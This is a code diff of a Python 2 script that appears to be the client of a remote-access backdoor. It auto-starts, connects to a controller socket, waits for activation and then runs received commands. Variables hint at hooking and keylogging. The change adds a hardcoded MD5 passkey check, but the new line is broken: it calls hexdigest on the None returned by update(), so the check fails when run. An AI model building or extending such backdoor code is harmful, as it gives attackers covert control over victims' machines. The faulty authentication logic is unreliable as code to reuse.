@@ -5,6 +5,7 @@ import socket
 import time
 import os
 import subprocess
+import hashlib
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -12,7 +13,7 @@ active = False
 printf = ''
 hooked = {}
 loggingState = False
-passKey = r''
+passKey = r'1705a7f91b40320a19db18912b72148e'
 
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
@@ -61,9 +62,13 @@ def fromAutostart():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
             data = Receive(s)
-            if data == 'Activate':
+            if hashlib.md5().update(data).hexdigest() == passKey:
                 active = True
                 Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')
+                print 'Access Success'
+            else:
+                Send(s, 'Access Denied')
+                print 'Access Denied'
 
             while active:
                 data = Receive(s)
